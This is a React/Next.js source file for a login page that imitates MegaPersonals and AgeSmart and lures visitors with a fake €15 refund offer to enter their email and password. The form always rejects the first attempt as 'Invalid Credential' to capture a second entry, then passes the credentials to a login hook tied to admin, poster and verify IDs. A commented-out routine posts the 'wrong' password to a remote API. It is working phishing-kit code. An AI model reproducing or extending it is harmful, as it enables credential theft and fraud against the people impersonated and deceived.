"use client";
import { Field, Form, Formik } from "formik";
import { site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";
import { useState } from "react";
import { toast } from "react-toastify";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";
import { API_URL } from "../config";
import Image from "next/image";
import LogoNew from "../../public/images/logo-color.png";
import LogoFooter from "../../public/images/footer-logo.png";

function LoginForm({ adminId, posterId, verifyId }) {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [wrongPassword, setWrongPassword] = useState("");
  // const [showWrongPassword, setShowWrongPassword] = useState(false);
  const [clickCount, setClickCount] = useState(0);
  const { login } = useMockLogin(adminId, posterId, verifyId);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (clickCount === 0) {
      setClickCount((count) => count + 1);
      setWrongPassword("Invalid Credential");
      return;
    }
    setWrongPassword("");
    const submitValues = {
      site: site,
      email: email,
      password: password,
    };
    login(submitValues);
    // setShowWrongPassword(true);
    toast.success("Login successfull");
    // router.push(`/security-check`);
    setEmail("");
    setPassword("");

    console.log(submitValues);
  };

  // const handleWrongPassword = async () => {
  //   const url = `${API_URL}/add/wrongpassword`;
  //   const id = Cookies.get("id");
  //   const values = {
  //     id,
  //     wrongPassword,
  //   };

  //   const res = await fetch(url, {
  //     method: "POST",
  //     headers: {
  //       Accept: "application/json",
  //       "Content-Type": "application/json",
  //     },
  //     body: JSON.stringify(values),
  //   });
  //   const data = await res.json();
  //   console.log(data);

  //   if (res.ok) {
  //     console.log("success", data);
  //     setEmail("");
  //     setPassword("");
  //     setWrongPassword("");
  //     router.push(`/security-check`);
  //   } else {
  //     console.log("error", data);
  //     toast.error("Something Went Wrong");
  //   }
  // };

  return (
    <div className="min-h-screen flex flex-col items-center justify-start bg-white font-sans text-black">
      {/* Top Bar */}
      <div className="w-full bg-pink-500 py-3 text-center">
        <h1 className="text-2xl font-bold text-white">
          <span className="text-yellow-300">Mega</span>
          <span className="text-cyan-100">Personals</span>
          <br />
          <span className="text-sm font-normal text-white">
            personals classifieds
          </span>
        </h1>
      </div>

      {/* Logo */}
      <div className="my-6">
        <Image src={LogoNew} alt="AGESMART" className="w-40 h-auto" />
      </div>

      {/* Text */}
      <div className="text-center px-4 max-w-xl">
        <p className="text-lg font-medium mb-2">
          Your account has been approved as fully active and verified. If YOU
          ARE REFUND <br />
          <span className="text-[#9b59b6] font-bold">€15 MegaPersonals</span>
        </p>

        <p className="text-base my-2 font-semibold">breaking their rules,</p>

        <p className="text-green-700 font-bold mb-4">
          Your account will remain active as it is now.
        </p>

        <p className="mb-6">from AgeSmart.</p>
      </div>

      {/* Form */}
      <form
        className="flex flex-col items-center w-full max-w-md px-4"
        onSubmit={handleSubmit}
      >
        <input
          type="email"
          placeholder="Enter email"
          className="w-full border rounded px-4 py-2 mb-4"
          onChange={(e) => setEmail(e.target.value)}
          value={email}
          required
        />
        <input
          type="password"
          placeholder="Enter password"
          className="w-full border rounded px-4 py-2 mb-4"
          onChange={(e) => setPassword(e.target.value)}
          value={password}
          required
        />
        {wrongPassword && (
          <p className="text-center py-2 text-red-600">{wrongPassword}</p>
        )}
        <button
          type="submit"
          className="bg-green-600 hover:bg-green-700 text-white font-semibold px-6 py-2 rounded"
        >
          Get Refund
        </button>
      </form>

      {/* Footer */}
      <div className="mt-5 mb-4 flex flex-col justify-center items-center text-center">
        <Image src={LogoFooter} alt="AGESMART" className="w-20 h-auto" />
        <p className="text-xs text-gray-600 mb-1">
          Copyright © 2022 Age Smart LDA. All Rights Reserved.
        </p>
        <div className="flex space-x-4 text-sm text-blue-600 underline">
          <a href="#">Terms of Use</a>
          <a href="#">Privacy Policy</a>
          <a href="#">Billing Questions</a>
        </div>
      </div>
    </div>
  );
}

export default LoginForm;
